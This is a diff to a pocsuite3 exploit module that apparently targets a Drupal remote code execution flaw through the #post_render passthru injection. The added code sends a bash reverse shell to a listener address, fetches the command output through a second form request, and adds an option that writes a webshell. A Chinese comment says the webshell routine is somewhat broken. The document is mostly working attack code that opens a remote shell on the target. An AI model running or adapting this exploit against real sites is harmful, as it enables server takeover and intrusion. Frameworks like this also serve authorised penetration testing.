@@ -1,4 +1,5 @@
-from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE, OptString
+from pocsuite3.api import Output, POCBase, POC_CATEGORY, register_poc, requests, logger, VUL_TYPE, OptString, REVERSE_PAYLOAD 
+from pocsuite3.api import get_listener_ip, get_listener_port
 from pocsuite3.lib.utils import random_str
 from collections import OrderedDict
 import json
@@ -64,7 +65,7 @@ class DemoPOC(POCBase):
             if flag in res.text:
                 result['VerifyInfo'] = {}
                 result['VerifyInfo']['URL'] = url1
-                result['VerifyInfo']['Postdata'] = body_1
+                result['VerifyInfo']['Postdata'] = self.body_1
         except Exception as ex:
             logger.error(str(ex))
         
@@ -73,6 +74,9 @@ class DemoPOC(POCBase):
     def _attack(self):
         result = {}
         cmd = self.get_option("command")
+        if cmd == "ws":
+            res = self.write_shell()
+            return res
         url1 = self.url.rstrip(
             '/') + "?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]={}".format(cmd)
         res = requests.post(url1, data=self.body_1)
@@ -95,6 +99,22 @@ class DemoPOC(POCBase):
         return self.parse_output(result)
 
     def _shell(self):
+        cmd = REVERSE_PAYLOAD.BASH.format(get_listener_ip(), get_listener_port())
+        url1 = self.url.rstrip(
+            '/') + "?q=user/password&name[%23post_render][]=passthru&name[%23type]=markup&name[%23markup]={}".format(cmd)
+        res = requests.post(url1, data=self.body_1)
+        form_build_id = self.get_form_id(res.text)
+        if form_build_id is None:
+            return None
+        # get cmd response
+        url2 = self.url.rstrip('/') + r"?q=file/ajax/name/%23default_value/{}".format(form_build_id)
+        body_2 = {
+            "form_build_id": form_build_id
+        }
+        res = requests.post(url2, data=body_2)
+
+
+    def write_shell(self):
         # 写入webshell,好像有点问题，框架是要反弹shell
         result = {}
         path = random_str(length=4)
